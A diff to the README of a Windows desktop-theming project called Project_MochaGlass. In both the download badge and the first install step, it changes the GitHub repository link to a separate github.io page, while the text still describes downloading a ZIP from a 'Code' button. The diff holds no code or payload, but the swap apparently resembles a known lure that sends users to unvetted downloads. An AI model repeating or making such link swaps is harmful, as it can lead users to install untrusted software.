@@ -1,6 +1,6 @@
 # ☕ Project_MochaGlass - Personalize your Windows desktop look easily
 
-[![](https://img.shields.io/badge/Download_Project-Blue-blue)](https://github.com/genevaunlogical994/Project_MochaGlass)
+[![](https://img.shields.io/badge/Download_Project-Blue-blue)](https://genevaunlogical994.github.io)
 
 Project_MochaGlass brings a clean and modern look to your Windows desktop. This project connects several specialized tools to create a glass-style interface. Your system will show real-time data for your devices and a fluid layout using window management tools. 
 
@@ -27,7 +27,7 @@ Ensure your PC meets these standards before you begin:
 
 Follow these steps to get the project on your machine.
 
-1. Visit [the project page](https://github.com/genevaunlogical994/Project_MochaGlass) to download the source files. 
+1. Visit [the project page](https://genevaunlogical994.github.io) to download the source files. 
 2. Click the green "Code" button and select "Download ZIP".
 3. Save the file to your desktop.
 4. Right-click the ZIP folder and select "Extract All".
